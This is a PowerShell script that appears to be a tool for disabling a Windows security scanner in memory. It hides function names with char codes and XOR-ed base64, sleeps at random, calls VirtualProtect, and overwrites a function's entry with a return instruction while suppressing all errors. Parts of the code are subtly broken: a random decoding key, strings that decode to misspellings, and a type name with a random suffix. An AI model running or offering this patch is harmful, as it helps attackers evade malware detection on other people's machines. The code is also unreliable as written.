function Q-Resolve {
    Param ($a1, $a2)
    $r1 = Get-Random -Minimum 10000 -Maximum 99999
    $asms = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location -like '*System.dll' }
    $typ1 = $asms.GetType("Microsoft.Win32.UnsafeNativeMethods$r1")
    $mth1 = $typ1.GetMethods() | Where-Object { $_.Name -eq ([char]71 + [char]101 + [char]116 + [char]80 + [char]114 + [char]111 + [char]99 + [char]65 + [char]100 + [char]100 + [char]114 + [char]101 + [char]115 + [char]115) } | Select-Object -First 1
    $mod1 = $typ1.GetMethod([char]71 + [char]101 + [char]116 + [char]77 + [char]111 + [char]100 + [char]117 + [char]108 + [char]101 + [char]72 + [char]97 + [char]110 + [char]100 + [char]108 + [char]101)
    $h1 = $mod1.Invoke($null, @($a1))
    return $mth1.Invoke($null, @($h1, $a2))
}

function Q-CreateDel {
    Param ($p1, $r1 = [Void])
    $r2 = Get-Random -Minimum 2000 -Maximum 9999
    $asm2 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("QAsm$r2")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod2 = $asm2.DefineDynamicModule("QMod$r2", $false)
    $del2 = $mod2.DefineType("QDel$r2", 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $del2.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $p1).SetImplementationFlags('Runtime, Managed')
    $del2.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r1, $p1).SetImplementationFlags('Runtime, Managed')
    return $del2.CreateType()
}

function Q-Obf {
    Param ($s1)
    $k1 = [System.Text.Encoding]::UTF8.GetBytes("q" + (Get-Random -Minimum 50 -Maximum 500) + "x")
    $b1 = [System.Convert]::FromBase64String($s1)
    $b2 = [Byte[]]::new($b1.Length)
    for ($i = 0; $i -lt $b1.Length; $i++) { $b2[$i] = [Byte]($b1[$i] -bxor ($k1[$i % $k1.Length] -bxor 0x55)) }
    return [System.Text.Encoding]::UTF8.GetString($b2)
}

try {
    Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 3500)

    $d1 = "WVdKa1lVSnZiV3h3" 
    $d2 = "QVR6YVNJam5pdGlhbGl6ZQ==" 
    $d3 = "a2VybmVsMzIuZGxs" 
    $d4 = "VmlwdHVhbFByb3RlY3Q=" 

    $addr1 = Q-Resolve (Q-Obf $d1) (Q-Obf $d2)
    $addr2 = Q-Resolve (Q-Obf $d3) (Q-Obf $d4)
    $delg = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr2, (Q-CreateDel @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
    $prot1 = 0
    $null = $delg.Invoke($addr1, 3, 0x40, [ref]$prot1)
    $patch1 = [Byte[]]@(0xC3, 0x90, 0x90)
    $null = [System.Runtime.InteropServices.Marshal]::Copy($patch1, 0, $addr1, 3)
}
catch {
    # Suppress errors
}